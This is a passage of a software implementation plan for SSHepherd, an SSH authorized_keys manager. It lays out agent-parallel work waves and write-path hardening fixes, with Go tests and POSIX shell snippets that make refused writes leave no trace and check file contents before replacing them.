5. Print `manifest OK: N users, N servers, N grants (N warnings)`.

Exit codes: 0 = valid, 1 = warnings under `--strict`, 3 = invalid. Optional `--json` is **D25a** (asked right after D25). Recommend not in the first slice.

`audit --server NAME` (repeatable): reuse `selectServers` (`apply.go:361`, or P06's `fleet.go` if it moves there), pass `audit.Options.Servers` (`audit.go:172-174`, which already exists), and print `(N servers skipped by --server)`. JSON gets an additive `skipped` count (schema 1). An unknown name exits 3.

`maintenance: true`, `grant` and validate's git-HEAD diff are **D25b** (asked right after D25a): "Are `maintenance: true`, a `grant` command and a 'what changed since HEAD' view wanted later? Recommend: later, each with its own spec." Nothing is deferred without the owner hearing it.

`grant USER --server|--group`: named only. It gets its own spec after D20, because it mirrors `revoke`'s edit pipeline and `manifest.AddMember`.

Tests: `validate_test.go` (valid, invalid, warnings, `--strict`, anchors warning, known_hosts gap), `audit_test.go` (`--server` subset, unknown name, JSON skipped), help goldens (P01's `testdata/help`), README flag tables (`help_readme_test.go`).

README: the command list, a new `validate` table and a GitOps PR-check recipe, plus the audit flag table.

##### D26 — Flag-name outliers (UX-7)

The spec must give a per-flag table with a recommendation for each:

| Today | Recommendation | Mechanism |
|---|---|---|
| `import --operator PATH` (`import.go:431`) | Rename to `--operator-key PATH` | Keep `--operator` as an alias via `cmd.Flags().MarkDeprecated("operator", "use --operator-key")` for one release. It is hidden, so `help_readme_test.go:73` skips it |
| `revoke --server NAME` (`revoke.go:72`) | Rename to `--from-server`, with `--server` as a hidden deprecated alias, **and** always print a header line `USER keeps access to N other servers` | The header line is the minimum fix even if the rename is declined |
| `adopt --merge` (bool) vs `import --merge FILE` | Keep both. Clarify the help text ("merge into --config" / "merge into FILE"). adopt always has a manifest, import does not | Help text only |
| `--identity-passphrase KEY=FILE` (`identity.go:32`) | Change the varname to `PATH=FILE` | Help varname only. `TestHelpShowsIdentityVarnames` (`help_readme_test.go:88`) and the README tables change |
| `revoke/rotate --operator` (bool) | Keep. After D21 the help says "confirm a protected target" | Help text |

Tests: deprecation tests (the old flag still works and prints a stderr notice; hidden from `--help`), help goldens, and the revoke header golden (`internal/apply/testdata/edit_*.golden`).

README: every touched flag table, plus one line in each command's section about the deprecated alias.

#### Task 3 — Post-approval implementation outline (goes into the spec's last section)

Each approved decision becomes **its own slice**, with a slice spec lifted from its section and a writing-plans plan in the `2026-11-07-apply-json.md` format. Run order and parallel shape:

| Slice | Decision | Earliest wave | Parallel agents inside the slice (disjoint files) | Must follow |
|---|---|---|---|---|
| S1 `validate` + `audit --server` | D25 | 3 | A: `cmd/sshepherd/validate.go`, `validate_test.go` (new) plus the `run.go` AddCommand line · B: `cmd/sshepherd/audit.go`, `audit_test.go`, `internal/audit/json.go` (`skipped`) | P06 (audit.go, fleet.go), P07 (audit json), P13 (run.go) |
| S2 flag renames | D26 | 3 (in parallel with S1: no shared files) | A: `import.go`, `import_test.go` · B: `revoke.go`, `revoke_test.go`, `internal/apply/edit.go` header plus goldens · C: `identity.go` varname | P01, P06, P12. Lands before P14 (wave 4) or rebases onto it |
| S3 groups/tags | D20 | 5 | A: `internal/config/*` (types defined in the plan first) · B: `internal/manifest/*` · C: `cmd/sshepherd/{manifest_out,adopt,revoke}.go` | P04/D1 and D4 schema slices (same three files), P12 |
| S4 protected | D21 | 6 | A: `internal/config` · B: `internal/audit/{report,json}.go` · C: `internal/apply/json.go`, `cmd/sshepherd/{editrun,revoke}.go`, `internal/reconcile` | S3 (config.go), P14 |
| S5 via | D23 | 7 | A: `internal/config` (field plus validation) · B: `internal/sshconn/connect.go` plus `sshtest` · C: `internal/sshcfg`, `cmd/sshepherd/import.go` · D: `internal/apply/exec.go` order | S4 (config.go), P03/P13 (integration.sh), P11 (exec.go), P14 (connect.go) |
| S6 preserve | D24 | 8 | A: `internal/config` · B: `internal/authkeys/render.go`, `internal/apply/plan.go` · C: `internal/audit`, `internal/adopt` | S5 (config.go), P05/P11 (plan.go) |
| — options | D22 | deferred | — | P05 |

Every slice uses the standard shape: agents in worktrees stage diffs → one integrator applies them, runs `make check` and `make integration`, updates README and the CLAUDE.md Status in the same commit, and commits on master → an independent verifier → a repair pass. S3–S6 are in different waves because they all edit `internal/config/config.go` (and S3/S6 also edit `manifest_out.go`).

#### Task 4 — Self-review before handing back

The spec agent checks the following and fixes anything that fails:
- `grep -c '^#### D2[0-6]\|^## D2[0-6]' <spec>` shows all seven sections.
- No section proposes prune, `--force`, `--prefer`, key generation or scheduled rotation, move-key, or a wipe mode: `grep -nEi 'prune|--force|--prefer|move-key|wipe' <spec>` shows only "out of scope" or "stays clear" lines.
- Every file:line cited exists (spot-check with `sed -n`).
- Every section has README impact, touched packages, tests, and the owner-decision box.
- `git status --porcelain` lists only the new spec file.

#### Acceptance

```sh
cd /Users/javad/w/personal/SSHepherd
test -f docs/superpowers/specs/2026-11-08-access-model-roadmap-design.md
git status --porcelain            # exactly: ?? docs/superpowers/specs/2026-11-08-access-model-roadmap-design.md
grep -cE '^#{2,4} D2[0-6]' docs/superpowers/specs/2026-11-08-access-model-roadmap-design.md   # 7
grep -c 'Owner decision' docs/superpowers/specs/2026-11-08-access-model-roadmap-design.md      # >= 7
GOTOOLCHAIN=go1.27.3 make check   # unchanged: doc-only package (the integrator runs it with the wave)
```
Then the owner is asked D25, D26, D20, D21, D23, D24, D22, **one at a time**, each with its recommendation. The answers are recorded in the spec's decision boxes (Status → `Approved <date>` per section) before any slice S1–S6 is planned.

#### Out of scope

- Any code, test, README, golden or CLAUDE.md change. This package writes only the spec.
- Implementing D20–D26. Each becomes its own slice after the owner decides.
- The owner-held items: prune, `apply --force`, `import --prefer`, key generation and scheduled rotation, move-key, and apply wipe/empty-server mode. D24 explicitly keeps the never-write-an-empty-desired-server rule.
- The `grant` command design (named only), `maintenance: true`, `host_key_alias:`, bastion connection pooling, and `validate --json` / git-HEAD diffing. Each is listed as a later follow-up.
- D1–D19 (P04, P08, P09 own those specs). This spec only cross-references D1/D4 for schema ordering and D17 for hop key offering.

---

## Wave 2 — write-path correctness, the manifest store, CI hygiene

**Starts:** after W1 is committed. P11 needs P03 (W0) and P05/P07 (W1); P12 needs P05/P06 (W1); P13 needs P02/P03 (W0). **Decisions needed before W2 starts (Block 2):** D8 and D8a (P12 Task 8; safe default: today's exit codes), D30 (P11 Task 6; safe default: skip it), D31 (P11 Task 5; safe default: skip it), D7 (P13 Task 9; skipped unless D7 = option 1).
**Packages:** P11, P12, P13. 19 findings here (P13's OPS-7 already landed in W0 as lane P13-0). The wave runs in **two rounds**: P13's fuzz rewrite and distro matrix run on P11's new write script, and P12-C codes against P12-A's new store, so they wait for the round-1 commits (review panel: a lane must be able to run its own FAIL → PASS steps in its own worktree).

| Round | Lane | Package / tasks | Files (exclusive in that round) | `make integration` |
|---|---|---|---|---|
| 1 | P11-11A | Tasks 1, 2, 3, 7 (sshwrite part), 8 | `internal/sshwrite/sshwrite.go`, `sshwrite_test.go`, `integration_test.go` | yes (lock) |
| 1 | P11-11B | Tasks 4, 7 (sanitize + sshconn part), 7b | `internal/sshread/{sshread,sshread_test,hermetic_test,integration_test}.go`, `internal/sshconn/{sshconn,sshconn_test,connect,connect_test}.go`, `internal/sanitize/sanitize.go`, `truncate_test.go` (new) | yes (lock) |
| 1 | P11-11C | Tasks 5, 6 | `internal/apply/{exec,exec_test,plan,plan_test,identity_test,offer_rank_test}.go`, `internal/audit/audit.go`, `audit_test.go`, `cmd/sshepherd/probe_order_hermetic_test.go` (new) | no |
| 1 | P12-A | Tasks 1–4 | `internal/manifest/store*.go` (new), `manifest.go`, `manifest_test.go`, `fuzz_test.go` | no |
| 1 | P12-B | Task 9 | `cmd/sshepherd/revoke.go`, `revoke_test.go`, `keyarg.go` (doc comment only) | no |
| 1 | P13-A | Tasks 2, 5, 8 (Task 1 ran in W0) | `Makefile`, `cmd/sshepherd/run.go` (one line), `run_test.go`, `version_test.go` (new) | no |
| 1 | P13-B | Task 3 | `internal/sanitize/sanitize_test.go` | no |
| 1 | P13-C | Tasks 7, 9 (if D7 = 1), 12 Steps 1–3 | `.github/workflows/ci.yml`, `release.yml`, `.github/dependabot.yml`, `ci/images/trivy.Dockerfile`, `ci/images/dockle.Dockerfile` (new), `scripts/docker-gates.sh` | no |
| 2 | P12-C | Tasks 5–8 | `cmd/sshepherd/{edit,edit_save_test,edit_test,manifest_out,manifest_out_test,adopt,adopt_test,import,import_test,import_merge_test,schema_roundtrip_test}.go`, `edit_lock_*.go` (removed), `testdata/adopt_*.golden`, `testdata/import_*.golden`, `testdata/help/adopt.golden` | no |
| 2 | P13-B | Tasks 4, 6 (all targets, using `make fuzz-list` from round 1) | `internal/sshwrite/fuzz_test.go`, new corpus dirs under `internal/*/testdata/fuzz/<NewTarget>/` | no |
| 2 | P13-D | Tasks 10–11, Task 12 Step 4 | `scripts/integration.sh`, `cmd/sshepherd/e2e_test.go`, `ci/images/sshd-{alpine,debian,rocky}.Dockerfile` (new), `.github/workflows/ci.yml` and `release.yml` (integration matrix only; P13-C has no round-2 work) | yes (all three distros) |

**Merge order and commits:** round 1: P11 (11B → 11A → 11C) → P12 (A → B) → P13 (A → B → C). Round 2 (worktrees at the round-1 `baseSha`): P12-C → P13 (B → D). One commit per lane (review panel, ops-release), so the distro matrix and the workflow rewrite can each be reverted alone.

**Integrator hand-offs (W2):**
- **P11 changes key order:** the new `GrantedFingerprints`/`OfferOrder` order changes which key audit, adopt and apply log in with. A `cmd/sshepherd` test that pinned the old order (P12/P13 files) is fixed as a merge fix.
- **P11 + P03 test:** keep `TestOwnerChecksBite` green; if the owner-check text changed, update `ownerMutants`. P11 Task 1 adds a second `ancestorCheck` occurrence, so the mutant indices in `ownerMutants` shift: update them, never delete the test.
- **P13 vs earlier packages:** `make fuzz` now discovers targets (`go test -list '^Fuzz'`), so `FuzzCheckOption` (P05), `FuzzRemoteSnippet` (P11) and later `FuzzParseHeader` (P04-impl) need no Makefile edit; check them with `make fuzz-list`.
- **P13 vs P02:** keep `go-version-file: go.mod`; signed release binaries get their own `release-binaries` job (P13 Task 9, revised); Trivy config scans skip `ci/images` in `ci.yml`, `release.yml` and `Makefile:152`.
- **P13 vs P03:** Task 10 replaces P03's `chown nobody:nobody` and the `AuthorizedKeysFile` sed guard with portable helpers (Debian has `nogroup` and a commented-out line), checked with `sshd -T`.
- **P12 vs D8/D8a:** if D8 = option 1, update the exit-0 assertions in P05's `adopt_options_test.go` and reconcile `e2e_test.go` (P13). If D8a = no, P12 Task 8 keeps today's exit for a zero-read run and only fixes the "nothing to adopt" wording.
- **Spec amendments (P12):** one-line amendments in the revoke-rotate, adopt-merge and import-merge specs (in-place `--merge`, lock-file rule).
- **Owner after merge:** check Insights → Dependency graph → Dependabot lists `ci/images/*.Dockerfile` (else rename to `Dockerfile.<name>`). Required checks: only `ci-ok` (P02), so the matrix rename needs no ruleset change.

**Wave exit:** `make check`, `make fuzz`, `make integration IT_DISTRO=alpine|debian|rocky`, actionlint (`-shellcheck=`, see P13 Task 5); the CI preflight branch run (Execution model step 6); verifier and repair. Real write-script bugs that the debian or rocky runs expose go to the repair pass (owned by P11's files), not to P13.

### P11 — Write-path correctness: CAS-then-mv ordering, fsync, refusals change nothing, probe order = production order, keys2 on equivalent paths, apply/audit agreement, bounded remote text

> **Program notes (master plan):** Ownership amended: also `internal/apply/identity_test.go`. `FuzzRemoteSnippet` is picked up by P13's discovered fuzz list. P13's round-2 lanes start after this package is committed.

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this package task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

- **Kind:** fix
- **Wave:** 2
- **Depends on:** P03 (sshwrite/sshtest test net, wave 0), P05 (`internal/apply/plan.go` + `plan_test.go`, wave 1), P07 (`internal/audit/audit.go` + `audit_test.go`, wave 1). Rebase on all three before you start.
- **Owner decisions needed (asked before W2, one at a time, Block 2):** **D30** (COR-2: apply refuses, exit 1, a server with no grants but a non-empty `authorized_keys2`; safe default if unanswered: Task 6 is skipped and today's exit 0 stays) and **D31** (WP-5: the login check tests keys in the order later runs use, so it no longer prefers `--identity` files; safe default if unanswered: Task 5 is skipped). Everything else stays inside today's documented contract: "what you reviewed is what gets replaced", "refusals change nothing", "the probe catches a forced `command=`", and "apply never wipes". COR-2 refuses and never writes, so it stays inside the on-hold *apply wipe/empty-server mode* decision.
- **Behavior change, named:** WP-5 drops the "key files before agent keys" probe preference (README:1255, :1440). The earlier second, key-files-only probe was removed by the review panel; a warn-only headless proof is D9b in P08.

**Goal:** Close seven write-path gaps:
- The write script checks the compare-and-swap (CAS) after the upload, and `.bak` holds exactly the bytes that were checked.
- The new file's data and its `.bak` are flushed per file before the rename (no global `sync`).
- A refused write creates nothing, even for a path with `..` (a second walk after `mkdir`, undone on refusal).
- The post-write probe offers keys in the same order every later connection will.
- `authorized_keys2` is checked when the managed path is the default file under another spelling.
- `apply` and `audit` agree on a server with no grants but a non-empty keys2.
- Remote stderr and handshake/disconnect text in error lines are bounded to 256 safe characters.

**Architecture:** There are three disjoint file groups, and each gets its own agent (see Execution model):
- **11A, the write script** (`internal/sshwrite`): `writeCmdFor` is reordered as walk-nearest-ancestor → mkdir → walk `$d` again (removing what it just created on a refusal) → lock → upload → length check → per-file flush of the temp (`dd conv=fsync`, never a global `sync`) → [snapshot copy → CAS on the copy → `.orig` → copy becomes `.bak` (flushed) → `mv`]. The probe stage is unchanged (one probe).
- **11B, the read side** (`internal/sshconn/{sshconn,connect}.go`, `internal/sshread`, `internal/sanitize`): a path-aware `SecondaryKeysCmdFor`, a new `sanitize.RemoteSnippet`, and handshake/disconnect text bounded by it (Task 7b).
- **11C, the plan side** (`internal/audit/audit.go`, `internal/apply/{exec,plan}.go`): one ordering function, `audit.OfferOrder`, feeds both `GrantedFingerprints` (production) and the probe. `planOne` refuses the no-grants + keys2 case.

**Tech Stack:** Go 1.27, POSIX sh (dash, `bash --posix`, busybox ash, through the existing `forEachShell` matrix), the hermetic `sshtest` server, the dockerized Alpine sshd (`make integration`), and goleak (the existing `TestMain` per package).

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| WP-3 | LOW | The CAS runs before the upload (`sshwrite.go:203-209`), so a key that ssh-copy-id, Ansible or a human adds during the upload is overwritten and appears in no backup. |
| WP-4 | LOW | Nothing is fsynced (`sshwrite.go:205-209`). On XFS a crash after the rename can leave an empty `authorized_keys` and empty backups. |
| WP-9 | LOW | `mkdir -p "$d"` (`sshwrite.go:198`) runs before the ownership and ancestor walk, so a refusal (exit 48) can leave a new `~/.ssh` behind. This contradicts the `IsRefusal` doc (`sshwrite.go:313-315`). |
| WP-5 | MEDIUM | `probeOrder` (`exec.go:126-156`) puts unrestricted keys first, but every later connection offers `GrantedFingerprints` (`audit.go:125-131`) in plain `DesiredFor` order. A key that gains `command=` and is listed first passes the probe, then takes over every later session. |
| WP-10 | LOW | The keys2 probe runs only when `path == "~/.ssh/authorized_keys"` as a literal string (`sshread.go:185`), so `/home/alice/.ssh/authorized_keys` skips it. |
| COR-2 | LOW | With no grants, nothing installed and a non-empty keys2, `planOne` (`plan.go:173-177`) returns `converged` (exit 0) while `audit` reports drift (exit 1, `audit.go:76-84`). |
| SEC-8 | LOW | Remote stderr of up to 1 MiB goes into error text (`sshconn.go:97-98, 111`; `sshwrite.go:608-611`). Blank-looking runes such as U+2800, U+3164 and U+115F survive `sanitize.Remote` and can forge report rows. |

#### Files owned

| Agent | Files (exclusive inside P11) |
|---|---|
| **11A** (write script) | `internal/sshwrite/sshwrite.go`, `internal/sshwrite/sshwrite_test.go`, `internal/sshwrite/integration_test.go` |
| **11B** (read side + sanitize) | `internal/sanitize/sanitize.go`, `internal/sanitize/truncate_test.go` (new), `internal/sshconn/sshconn.go`, `internal/sshconn/sshconn_test.go`, `internal/sshconn/connect.go`, `internal/sshconn/connect_test.go` (Task 7b), `internal/sshread/sshread.go`, `internal/sshread/sshread_test.go`, `internal/sshread/hermetic_test.go`, `internal/sshread/integration_test.go` |
| **11C** (plan side) | `internal/audit/audit.go`, `internal/audit/audit_test.go`, `internal/apply/exec.go`, `internal/apply/exec_test.go`, `internal/apply/plan.go`, `internal/apply/plan_test.go`, `internal/apply/offer_rank_test.go` (new), `cmd/sshepherd/probe_order_hermetic_test.go` (new), **`internal/apply/identity_test.go`** (not in the package's file list: `TestProbeOrder` at identity_test.go:152 calls `probeOrder` and must change; no other package claims the file) |
| **Integrator** | `README.md`, `CLAUDE.md` (Status), merge fixes |

#### Execution model

- The three agents run **in parallel**, each in its own git worktree. **No commits.** Each one leaves a staged diff.
- **Cross-agent signatures are fixed now.** Code against them:
  - 11B: `func sanitize.RemoteSnippet(s string) string` and `const sanitize.MaxSnippet = 256`.
  - 11B: `func sshconn.SecondaryKeysCmdFor(path string) string`.
  - 11C: `func audit.OfferOrder(desired []authkeys.Key) []string` and `func audit.OfferRank(options []string) int`.
- 11A may add a **temporary** `internal/sanitize/snippet_stub.go` in its own worktree only, and it must implement the frozen contract so 11A's own `TestStageFailureBoundsStderr` can pass (review panel, testing):
  ```go
  package sanitize

  // Temporary stub of 11B's RemoteSnippet for lane 11A only; deleted before hand-back.
  const MaxSnippet = 256

  func RemoteSnippet(s string) string {
  	var out []rune
  	for _, r := range s {
  		if len(out) == MaxSnippet {
  			return string(out) + "…(truncated)"
  		}
  		if r < 0x20 || r > 0x7e {
  			r = '?'
  		}
  		out = append(out, r)
  	}
  	return string(out)
  }
  ```
  The lane's ownership filter (Execution model) drops the stub from the patch even if the agent forgets.
- The integrator applies the diffs in the order 11B → 11A → 11C. It checks that `snippet_stub.go` is absent, runs `make check` and `make integration`, updates `README.md` and `CLAUDE.md`, and commits once on master. An independent verifier and a repair pass follow.
- The rtk hook summarizes test output. Use `rtk proxy go test …` when you need the exact failure lines.

---

#### Task 1 (11A): WP-9, a refused write creates no directory

**Files:** `internal/sshwrite/sshwrite.go` (`writeCmdFor` at :194-210, its doc comment at :163-193, the `IsRefusal` doc at :313-315), `internal/sshwrite/sshwrite_test.go`

- [ ] **Step 1: Write the failing test.** Add these subtests inside `TestWriteCmdThroughRealSh`'s `forEachShell` body. Also tighten the existing "group/other-writable ancestor refuses" subtest (around line 333) with one extra assertion.

```go
		t.Run("refusal creates no directory (group-writable home, no ~/.ssh)", func(t *testing.T) {
			home := t.TempDir()
			if err := os.Chmod(home, 0o775); err != nil { // #nosec G302 -- the unsafe home under test
				t.Fatal(err)
			}
			code := runSh(t, sh, writeCmdFor("~/.ssh/authorized_keys", Snapshot{Absent: true}, len(managed)), home, []byte(managed))
			if code != unsafePathExit {
				t.Fatalf("exit = %d, want %d", code, unsafePathExit)
			}
			assertAbsent(t, filepath.Join(home, ".ssh"), "IsRefusal promises nothing changed — no ~/.ssh may be created")
		})
```

In "group/other-writable ancestor refuses", after the existing `assertAbsent(t, target, …)`, add:

```go
			assertAbsent(t, filepath.Join(sub, "dot-ssh"), "a refused write must not create the missing directory")
```

- [ ] **Step 2: Run it and watch it fail.** `rtk proxy go test ./internal/sshwrite/ -run 'TestWriteCmdThroughRealSh/.*/(refusal_creates|group)' -v`. You should see `.ssh exists: IsRefusal promises nothing changed`.

- [ ] **Step 3: Implement.** Before any `mkdir`, find the nearest existing ancestor of `$d` and walk *that* directory, recording the top-most missing component in `m`. Run `mkdir -p` only when something is missing. **Then walk `$d` again with the full `ancestorCheck`** (review panel, security-writepath): `validateAuthorizedKeysFile` accepts `..` components, so for `~/new/../shared/.ssh/authorized_keys` with `~/new` missing the pre-walk only sees `$HOME`, and `mkdir -p` follows `..` into `shared`, which may be a foreign symlink or a world-writable directory. The second walk runs in a subshell; on a refusal the script removes, deepest first, the directories it just created (textual chain from `$d` up to `m`, `rmdir` only, errors ignored), so "refusals change nothing" still holds. The new `writeCmdFor` head:

```go
	return sshconn.PathAssign(path) +
		`; set -f; umask 077; u=$(id -u); d=$(dirname "$p"); b="$p"` + bakSuffix + `; o="$p"` + origSuffix + `; t="$p"` + tmpSuffix + `; c="$p"` + casSuffix +
		`; if [ -L "$p" ]; then exit 45; fi; if [ -L "$d" ]; then exit 48; fi` +
		// WP-9: walk the nearest EXISTING ancestor before creating anything,
		// so a refusal (48) leaves the tree exactly as it was.
		`; m=; e="$d"; while [ ! -e "$e" ] && [ ! -L "$e" ]; do m="$e"; e=$(dirname "$e"); done; D="$d"; d="$e"; ` + ancestorCheck + `; d="$D"` +
		`; if [ -n "$m" ]; then mkdir -p "$d" || exit 1; fi` +
		// The full walk of $d after mkdir: catches `..` and symlinks that the
		// textual pre-walk could not see. On refusal, undo what mkdir created.
		`; ( set -- $(ls -ldn "$d"); if [ "$3" != "$u" ]; then exit 48; fi; ` + ancestorCheck + ` ) || { r=$?; if [ -n "$m" ]; then q="$d"; while :; do rmdir "$q" 2>/dev/null; if [ "$q" = "$m" ] || [ "$q" = / ] || [ "$q" = . ]; then break; fi; q=$(dirname "$q"); done; fi; exit $r; }` +
		`; ` + lockPrologue + …   // continues in Task 2
```

Update the doc-comment steps 2–3 to match: "walk the nearest existing ancestor, create what is missing, then walk the target directory as written and resolved; a refusal removes the directories this run created". Keep the `IsRefusal` doc as it is, because it is now true. Add one sentence: "the write script creates no file or directory before its last refusal point except the lock, the upload temp and directories it removes again on refusal; its EXIT trap removes the first two."

Rejecting `.`/`..` components in `validateAuthorizedKeysFile` would also close this, but it tightens the manifest schema (an owner decision) and `internal/config` is not owned in W2. The post-mkdir walk alone closes the hole, so the schema stays as it is.

Add two more subtests to Step 1's set (shell matrix, using P03's `lsStub`; skip a row when `called()` is false, as P03 does):

```go
		t.Run("dotdot through a foreign symlink refuses and leaves nothing", func(t *testing.T) {
			home := t.TempDir()
			shared := filepath.Join(home, "shared")
			if err := os.Mkdir(filepath.Join(home, "real-shared"), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(filepath.Join(home, "real-shared"), shared); err != nil {
				t.Fatal(err)
			}
			env, called, _ := lsStub(t, shared, foreignUID)
			path := filepath.Join(home, "new", "..", "shared", "dot-ssh", "auth")
			code := runShEnv(t, sh, writeCmdFor(path, Snapshot{Absent: true}, len(managed)), home, []byte(managed), env...)
			if !called() {
				t.Skip("ls runs as an applet; the stub cannot fake an owner")
			}
			if code != unsafePathExit {
				t.Fatalf("exit = %d, want %d", code, unsafePathExit)
			}
			assertAbsent(t, filepath.Join(home, "new"), "a refused write must remove the directory it created")
			assertAbsent(t, filepath.Join(home, "real-shared", "dot-ssh"), "a refused write must remove the directory it created")
		})
		t.Run("dotdot through a world-writable directory refuses and leaves nothing", func(t *testing.T) {
			home := t.TempDir()
			if err := os.Mkdir(filepath.Join(home, "shared"), 0o777); err != nil { // #nosec G301 -- the unsafe directory under test
				t.Fatal(err)
			}
			if err := os.Chmod(filepath.Join(home, "shared"), 0o777); err != nil { // #nosec G302 -- beat the umask
				t.Fatal(err)
			}
			path := filepath.Join(home, "new", "..", "shared", "dot-ssh", "auth")
			code := runSh(t, sh, writeCmdFor(path, Snapshot{Absent: true}, len(managed)), home, []byte(managed))
			if code != unsafePathExit {
				t.Fatalf("exit = %d, want %d", code, unsafePathExit)
			}
			assertAbsent(t, filepath.Join(home, "new"), "a refused write must remove the directory it created")
			assertAbsent(t, filepath.Join(home, "shared", "dot-ssh"), "a refused write must remove the directory it created")
		})
```

Both FAIL on the head written in the earlier draft (walk of `$e` only: exit 0, file written under `shared`). Run them before and after the second walk is added.

- [ ] **Step 4: Run it and watch it pass.** `go test ./internal/sshwrite/ -run TestWriteCmdThroughRealSh -v`. All shells must pass, including "creates file and parent dir with owner-only modes" (first contact still creates `~/newdir` 0700).

#### Task 2 (11A): WP-3, upload first, then one tight CAS → backup → mv block

**Files:** `internal/sshwrite/sshwrite.go` (`writeCmdFor`, `lockPrologue` :147, a new `casSuffix` const, a new `casBackupBlock`; `casCheck` :215-221 stays for `restoreCmdFor`), `internal/sshwrite/sshwrite_test.go`

- [ ] **Step 1: Write the failing tests.** Add a real-pipe runner and a concurrent-edit subtest, plus a structural order pin.

```go
// runShConcurrent runs script with stdin on a real pipe: it writes first,
// waits until the upload temp has received it (the upload is in flight),
// runs mid (a concurrent, lock-less editor), then writes rest and closes.
func runShConcurrent(t *testing.T, sh []string, script, home, target string, first, rest []byte, mid func()) int {
	t.Helper()
	pr, pw, err := os.Pipe()
	if err != nil {
		t.Fatal(err)
	}
	argv := append(append([]string{}, sh[1:]...), "-c", script)
	c := exec.CommandContext(t.Context(), sh[0], argv...) // #nosec G204 -- the package's own script
	c.Env = append(os.Environ(), "HOME="+home)
	c.Stdin = pr
	if err := c.Start(); err != nil {
		t.Fatal(err)
	}
	_ = pr.Close()
	if _, err := pw.Write(first); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(5 * time.Second)
	for {
		if fi, err := os.Stat(target + tmpSuffix); err == nil && fi.Size() >= int64(len(first)) {
			break
		}
		if time.Now().After(deadline) {
			_ = pw.Close()
			t.Fatalf("upload temp never received %d bytes", len(first))
		}
		time.Sleep(5 * time.Millisecond)
	}
	mid()
	if _, err := pw.Write(rest); err != nil {
		t.Fatal(err)
	}
	_ = pw.Close()
	err = c.Wait()
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		return exitErr.ExitCode()
	}
	if err != nil {
		t.Fatal(err)
	}
	return 0
}
```

Add this inside `TestWriteCmdThroughRealSh`:

```go
		t.Run("a key added during the upload refuses and survives", func(t *testing.T) {
			home := t.TempDir()
			target := filepath.Join(home, "auth")
			const hand = "hand\n"
			writeFile(t, target, hand)
			writeFile(t, target+bakSuffix, "previous\n")
			content := []byte(managed + strings.Repeat("# pad\n", 64))
			half := len(content) / 2
			code := runShConcurrent(t, sh, writeCmdFor(target, SnapshotOf(false, []byte(hand)), len(content)), home, target,
				content[:half], content[half:], func() {
					f, err := os.OpenFile(target, os.O_APPEND|os.O_WRONLY, 0)
					if err != nil {
						t.Fatal(err)
					}
					_, _ = f.WriteString("copyid bob\n")
					_ = f.Close()
				})
			if code != changedExit {
				t.Fatalf("exit = %d, want %d — a key added mid-upload must refuse, not vanish", code, changedExit)
			}
			if got := readFile(t, target); got != hand+"copyid bob\n" {
				t.Errorf("file = %q, want the concurrent edit kept", got)
			}
			if got := readFile(t, target+bakSuffix); got != "previous\n" {
				t.Errorf(".bak = %q, a refused write must not rotate the backup", got)
			}
			assertNoResidue(t, target)
		})
```

Extend `assertNoResidue` (line 160) with `assertAbsent(t, target+casSuffix, "CAS staging copy left behind")`. Add the order pin at top level:

```go
// TestWriteCmdOrder pins the protocol order: nothing is created before the
// walk, the target directory is walked again after mkdir, the upload is
// flushed before the CAS, and only forks separate the CAS from the mv
// (WP-3/4/9). No global sync appears anywhere (Task 3).
func TestWriteCmdOrder(t *testing.T) {
	cmd := writeCmdFor("~/.ssh/authorized_keys", SnapshotOf(false, []byte("old\n")), 10)
	at := -1
	for _, step := range []string{
		`while [ ! -e "$e" ]`, `mkdir -p "$d"`, `( set -- $(ls -ldn "$d")`, `mkdir "$l"`, `command -v cksum`,
		`cat > "$t"`, `wc -c < "$t"`, `of="$t" conv=notrunc,fsync`,
		`cat "$p" > "$c"`, `cksum < "$c"`, `cat "$c" > "$o"`, `mv -f "$c" "$b"`, `of="$b" conv=notrunc,fsync`,
		`mv -f "$t" "$p"`,
	} {
		i := strings.Index(cmd, step)
		if i <= at {
			t.Fatalf("step %q at %d, want after %d in:\n%s", step, i, at, cmd)
		}
		at = i
	}
}
```

- [ ] **Step 2: Run them and watch them fail.** `rtk proxy go test ./internal/sshwrite/ -run 'TestWriteCmdOrder|TestWriteCmdThroughRealSh/.*/a_key_added' -v`. Today's order passes the CAS, takes the backup, then uploads, so you get `exit = 0, want 46`, and the order pin fails at `cat > "$t"`.

- [ ] **Step 3: Implement.** Changes:
  - Add `casSuffix = ".sshepherd.cas"` to the suffix block (:52-56).
  - In `lockPrologue`, change the trap to `trap 'rm -f "$p"` + tmpSuffix + ` "$p"` + casSuffix + `; rmdir "$l" 2>/dev/null' EXIT`.
  - Continue `writeCmdFor` after Task 1's head:

```go
		`; ` + lockPrologue +
		`; if [ -L "$p" ]; then exit 45; fi; if [ -e "$p" ]; then set -- $(ls -ldn "$p"); if [ "$3" != "$u" ]; then exit 48; fi; fi` +
		cksumPresent(expect) +
		// Upload and length-check first (the slow part), then flush it.
		`; rm -f "$t"; (set -C; cat > "$t") || { rm -f "$t"; exit 1; }` +
		`; set -- $(wc -c < "$t"); if [ "$1" != ` + strconv.Itoa(size) + ` ]; then rm -f "$t"; exit 49; fi` +
		`; dd if=/dev/null of="$t" conv=notrunc,fsync 2>/dev/null || :` + // WP-4 (Task 3): per-file flush, never a global sync
		`; ` + casBackupBlock(expect) +
		`; if [ -e "$b" ]; then dd if=/dev/null of="$b" conv=notrunc,fsync 2>/dev/null || :; fi` +
		`; mv -f "$t" "$p" || { rm -f "$t"; exit 1; }`
```

```go
// cksumPresent fails fast (before the upload) when the CAS needs cksum and
// the server has none.
func cksumPresent(expect Snapshot) string {
	if expect.Absent {
		return ""
	}
	return `; command -v cksum >/dev/null 2>&1 || { echo "sshepherd: cksum not found on the server" >&2; exit 1; }`
}

// casBackupBlock is the tight step between the completed upload and the mv
// (WP-3): copy the live file to a fresh staging name, compare-and-swap the
// COPY (46 on mismatch), derive .orig from it, and rename it to .bak — so
// .bak holds exactly the bytes the CAS validated, and a lock-less editor
// that changed the file during the upload refuses the write instead of
// losing its edit. rm -f + set -C keep the staging name from following a
// planted symlink; rm -f "$b" fails (exit 1) on a directory planted at .bak.
func casBackupBlock(expect Snapshot) string {
	if expect.Absent {
		return `if [ -e "$p" ] || [ -L "$p" ]; then exit 46; fi`
	}
